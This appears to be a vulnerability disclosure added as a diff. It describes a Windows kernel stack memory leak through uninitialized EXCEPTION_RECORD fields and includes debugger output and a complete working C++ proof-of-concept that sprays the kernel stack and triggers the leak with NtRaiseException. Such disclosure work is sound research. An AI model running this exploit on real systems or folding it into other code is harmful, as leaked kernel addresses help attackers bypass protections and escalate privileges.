@@ -1,0 +1,156 @@
+/*
+We have discovered a new Windows kernel memory disclosure vulnerability in the creation and copying of a EXCEPTION_RECORD structure to user-mode memory while passing execution to a user-mode exception handler. The vulnerability affects 64-bit versions of Windows 7 to 10.
+
+The leak was originally detected under the following stack trace (Windows 7):
+
+--- cut ---
+  kd> k
+   # Child-SP          RetAddr           Call Site
+  00 fffff880`040b7e18 fffff800`026ca362 nt!memcpy+0x3
+  01 fffff880`040b7e20 fffff800`026db3bc nt!KiDispatchException+0x421
+  02 fffff880`040b84b0 fffff800`0268fafb nt!KiRaiseException+0x1b4
+  03 fffff880`040b8ae0 fffff800`0268d093 nt!NtRaiseException+0x7b
+  04 fffff880`040b8c20 00000000`74b5cb49 nt!KiSystemServiceCopyEnd+0x13
+--- cut ---
+
+and more specifically in the copying of the EXCEPTION_RECORD structure:
+
+--- cut ---
+  kd> dt _EXCEPTION_RECORD @rdx
+  ntdll!_EXCEPTION_RECORD
+     +0x000 ExceptionCode    : 0n1722
+     +0x004 ExceptionFlags   : 1
+     +0x008 ExceptionRecord  : (null) 
+     +0x010 ExceptionAddress : 0x00000000`765fc54f Void
+     +0x018 NumberParameters : 0
+     +0x020 ExceptionInformation : [15] 0xbbbbbbbb`bbbbbbbb
+--- cut ---
+
+In that structure, the entire "ExceptionInformation" array consisting of 15*8=120 bytes is left uninitialized and provided this way to the ring-3 client. The overall EXCEPTION_RECORD structure (which contains the ExceptionInformation in question) is allocated in the stack frame of the nt!KiRaiseException function.
+
+Based on some cursory code analysis and manual experimentation, we believe that the kernel only fills as many ULONG_PTR's as the .NumberParameters field is set to (but not more than EXCEPTION_MAXIMUM_PARAMETERS), while the remaining entries of the array are never written to. As a result, running the attached proof-of-concept program reveals 120 bytes of kernel stack memory (set to the 0x41 marker with stack-spraying to illustrate the problem). An example output is as follows:
+
+--- cut ---
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000020: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000030: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000040: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000050: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000060: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000070: 41 41 41 41 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? AAAAAAAA........
+--- cut ---
+
+If we replace the stack-spraying function call in the code with a printf() call, we can immediately spot a number of kernel-mode addresses in the output dump:
+
+--- cut ---
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: a0 ce 1e 00 00 00 00 00 a0 ce 1e 00 00 00 00 00 ................
+  00000020: 00 00 00 00 00 00 00 00 64 0b 00 00 00 40 00 00 ........d....@..
+  00000030: b8 00 00 00 00 00 00 00 60 6e 83 5d 80 f9 ff ff ........`n.]....
+  00000040: 00 0d 78 60 80 f9 ff ff 00 00 00 00 80 f9 ff ff ..x`............
+  00000050: 00 00 00 00 01 00 00 00 00 01 00 00 00 00 00 00 ................
+  00000060: 10 01 00 00 00 00 00 00 00 70 f5 3f 01 00 00 00 .........p.?....
+  00000070: 50 0b 10 60 80 f9 ff ff ?? ?? ?? ?? ?? ?? ?? ?? P..`............
+--- cut ---
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+extern "C"
+NTSTATUS
+NTAPI
+NtRaiseException(
+  IN PEXCEPTION_RECORD    ExceptionRecord,
+  IN PCONTEXT             ThreadContext,
+  IN BOOLEAN              HandleException);
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  static bool initialized = false;
+  static HPALETTE(*EngCreatePalette)(
+    _In_ ULONG iMode,
+    _In_ ULONG cColors,
+    _In_ ULONG *pulColors,
+    _In_ FLONG flRed,
+    _In_ FLONG flGreen,
+    _In_ FLONG flBlue
+    );
+
+  if (!initialized) {
+    EngCreatePalette = (HPALETTE(*)(ULONG, ULONG, ULONG *, FLONG, FLONG, FLONG))GetProcAddress(LoadLibrary(L"gdi32.dll"), "EngCreatePalette");
+    initialized = true;
+  }
+
+  static ULONG buffer[256];
+  MyMemset((PBYTE)buffer, 'A', sizeof(buffer));
+  EngCreatePalette(1, ARRAYSIZE(buffer), buffer, 0, 0, 0);
+  MyMemset((PBYTE)buffer, 'B', sizeof(buffer));
+}
+
+LONG CALLBACK VectoredHandler(
+  _In_ PEXCEPTION_POINTERS ExceptionInfo
+) {
+  PrintHex((PBYTE)ExceptionInfo->ExceptionRecord->ExceptionInformation,
+           sizeof(ExceptionInfo->ExceptionRecord->ExceptionInformation));
+  ExitProcess(0);
+}
+
+int main() {
+  AddVectoredExceptionHandler(1, VectoredHandler);
+
+  // Initialize the exception record.
+  EXCEPTION_RECORD er;
+  RtlZeroMemory(&er, sizeof(er));
+  er.ExceptionAddress = main;
+  er.ExceptionCode = STATUS_ACCESS_VIOLATION;
+  er.ExceptionFlags = 0;
+  er.NumberParameters = 0;
+  er.ExceptionRecord = NULL;
+
+  // Initialize the CPU context.
+  CONTEXT ctx;
+  RtlZeroMemory(&ctx, sizeof(ctx));
+  ctx.ContextFlags = CONTEXT_ALL;
+  GetThreadContext(GetCurrentThread(), &ctx);
+
+  // Spray the kernel stack with a 0x41 marker byte.
+  SprayKernelStack();
+
+  // Trigger the memory disclosure.
+  NtRaiseException(&er, &ctx, TRUE);
+
+  return 0;
+}
